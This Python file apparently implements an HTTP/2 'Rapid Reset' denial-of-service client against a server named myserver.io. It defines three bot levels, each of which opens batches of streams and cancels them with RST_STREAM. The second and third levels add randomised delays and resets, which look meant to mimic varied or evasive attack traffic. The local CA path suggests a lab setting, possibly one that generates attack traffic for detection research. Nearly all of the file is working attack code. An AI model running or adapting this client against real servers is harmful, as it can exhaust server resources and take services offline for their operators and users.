import h2.connection
import h2.events
import socket
import certifi
import ssl
import time
import random
import numpy as np
from abc import ABC, abstractmethod
from h2.events import (
    ResponseReceived, DataReceived, StreamEnded,
    StreamReset, SettingsAcknowledged,
)

SERVER_NAME = 'myserver.io'
PATH = "/"
SERVER_PORT = 8443


class Bot(ABC):
    def __init__(self, iterations, max_open_streams):
        ctx = ssl.create_default_context(cafile=certifi.where())
        ctx.load_verify_locations("../server/ca/root_cert.pem")
        ctx.set_alpn_protocols(['h2'])
        s = socket.create_connection((SERVER_NAME, SERVER_PORT))
        self.soc = ctx.wrap_socket(s, server_hostname=SERVER_NAME)
        self.conn = h2.connection.H2Connection()
        self.iterations = iterations
        self.response_stream_ended = False
        self.open_streams = 0
        self.max_open_streams = max_open_streams

    def connect(self):
        self.conn.initiate_connection()
        self.soc.sendall(self.conn.data_to_send())

    def start(self):

        while not self.response_stream_ended:
            self.handle_events()
        self.end_stream()

    def handle_events(self):

        data = self.soc.recv(65536 * 1024)
        print(self.open_streams)
        if not data:
            return
        events = self.conn.receive_data(data)

        for event in events:
            print(event)

            if isinstance(event, ResponseReceived):
                self.__handle_data(event.headers, event.stream_id)
                break
            elif isinstance(event, DataReceived):
                self.__handle_data(event.data, event.stream_id, event.flow_controlled_length)
                break
            elif isinstance(event, StreamEnded):
                self.open_streams = self.open_streams - 1
                if self.open_streams == 0:
                    self.response_stream_ended = True
                break
            elif isinstance(event, SettingsAcknowledged):
                self.rapid_reset()
                break
            elif isinstance(event, StreamReset):
                self.open_streams = self.open_streams - 1

    @abstractmethod
    def rapid_reset(self):
        pass

    def send_request(self, stream_id):
        headers = [(':method', 'GET'),
                   (':path', '/'),
                   (':authority', SERVER_NAME),
                   (':scheme', 'https'),
                   ]

        self.conn.send_headers(stream_id, headers, end_stream=False)
        self.soc.sendall(self.conn.data_to_send())

    def __handle_data(self, data, stream_id,flow_controlled_length=None):
        print('stream_id: {} recieved \n'.format(stream_id), end='')
        if flow_controlled_length:
            self.conn.acknowledge_received_data(flow_controlled_length, stream_id)

    def end_stream(self):
        print(f"Closing Connection")
        self.conn.close_connection()
        self.soc.sendall(self.conn.data_to_send())
        self.soc.close()

    def reset_stream(self, stream_id):
        self.conn.reset_stream(stream_id=stream_id, error_code=0x8)
        self.soc.sendall(self.conn.data_to_send())


class BotLevel1(Bot):
    def __init__(self, iterations, max_open_streams):
        super().__init__(iterations, max_open_streams)

    def rapid_reset(self):

        streams_count = 1 # number of opened streams

        while self.iterations > 0:
            # open multiple streams
            for stream_id in range(streams_count, 2 * self.max_open_streams + streams_count, 2):
                print(f"Connectin-Id: {stream_id} - Number of already opened Streams: {streams_count + stream_id}")
                self.send_request(stream_id)
                self.open_streams = self.open_streams + 1

            streams_count = streams_count + 2 * self.max_open_streams


            # reset streams

            for stream_id in range(streams_count - 2 * self.max_open_streams,  streams_count - 2 * 2 , 2):
                print(f"Reset-Connection: {stream_id}")
                self.reset_stream(stream_id)
                self.open_streams = self.open_streams - 1


            self.iterations = self.iterations - 1

        self.response_stream_ended = True
        self.handle_events()




class BotLevel2(Bot):
    def __init__(self, iterations, max_open_streams):
        super().__init__(iterations, max_open_streams)

    def rapid_reset(self):
        streams_count = 1  # number of opened streams

        while self.iterations > 0:
            # open multiple streams
            for stream_id in range(streams_count, 2 * self.max_open_streams + streams_count, 2):
                print(f"Connectin-Id: {stream_id} - Number of already opened Streams: {streams_count + stream_id}")
                self.send_request(stream_id)
                self.open_streams = self.open_streams + 1
                time.sleep(abs(np.random.normal(1, 0.5)))

            streams_count = streams_count + 2 * self.max_open_streams

            # reset streams

            for stream_id in range(streams_count - 2 * self.max_open_streams,  streams_count - 2 * 2 , 2):
                print(f"Reset-Connection: {stream_id}")
                self.reset_stream(stream_id)
                self.open_streams = self.open_streams - 1

            self.iterations = self.iterations - 1

            time.sleep(random.randint(2, 5))

        self.response_stream_ended = True
        self.handle_events()


class BotLevel3(Bot):
    def __init__(self, iterations, max_open_streams):
        super().__init__(iterations, max_open_streams)

    def rapid_reset(self):
        streams_count = 1  # number of opened streams

        while self.iterations > 0:
            # open multiple streams
            for stream_id in range(streams_count, 2 * self.max_open_streams + streams_count, 2):
                print(f"Connectin-Id: {stream_id} - Number of already opened Streams: {streams_count + stream_id}")
                self.send_request(stream_id)
                self.open_streams = self.open_streams + 1
                time.sleep(abs(np.random.normal(0.01, 0.5)))

                if np.random.binomial(1, 0.5) == 1: # reset connection
                    print(f"Reset-Connection: {stream_id}")
                    self.reset_stream(stream_id)
                    self.open_streams = self.open_streams - 1
                elif np.random.binomial(1, 0.7) == 1 :
                    self.handle_events()

            streams_count = streams_count + 2 * self.max_open_streams

            self.iterations = self.iterations - 1

            time.sleep(np.random.gamma(0.8, 10))

        self.response_stream_ended = True
        self.handle_events()
